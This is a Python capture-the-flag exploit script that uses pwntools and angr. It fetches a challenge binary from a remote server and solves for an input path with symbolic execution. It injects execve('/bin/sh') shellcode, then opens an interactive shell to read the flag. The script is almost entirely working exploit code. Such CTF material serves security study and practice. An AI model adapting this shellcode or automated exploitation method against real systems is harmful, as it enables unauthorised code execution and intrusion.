#!/usr/bin/env python
import angr
import re
from pwn import *

# FLAG{Your Exploit is Mine: Automatic Shellcode Transplant for Remote Exploits}

host , port = '35.185.135.65' , 22365
y = remote( host , port )


y.sendafter( '(y/n)' , 'y\n' )
y.recvuntil( 'Base64 =================\n' )
y.recvline()

o = open( 'tmp' , 'w' )
o.write( base64.b64decode( y.recvline() ) )
o.close()


p = angr.Project( './tmp' , load_options={'auto_load_libs': False} )

state = p.factory.entry_state( )

l = 196

for i in xrange( l ):
    k = state.posix.files[0].read_from(1)
    state.solver.add( k != '\n' )

state.posix.files[0].seek(0)
state.posix.files[0].length = l


sm = p.factory.simulation_manager( state , immutable = False )


good = int( raw_input('good').strip() , 16 )
bad = int( raw_input('good').strip() , 16 )

sm.explore( find = good , avoid = bad )

context.arch = 'amd64'

_asm = '''
mov rax, 0x0068732f6e69622f
push rax
xor rsi, rsi
xor rdx, rdx
mov rdi, rsp
xor eax, eax
mov al, 0x3b
syscall
'''

sc = asm( _asm )

sm.found[0].add_constraints( sm.found[0].memory.load( 0x6020b2 , len(sc) ) == sc )

print ''.join( '\\x' + hex( ord( c ) ).replace( '0x' , '' ).rjust( 2 , '0' ) for c in sm.found[0].posix.dumps(0)[:196] )

y.sendline( sm.found[0].posix.dumps(0) )

y.sendline( 'cat flag' )

y.interactive()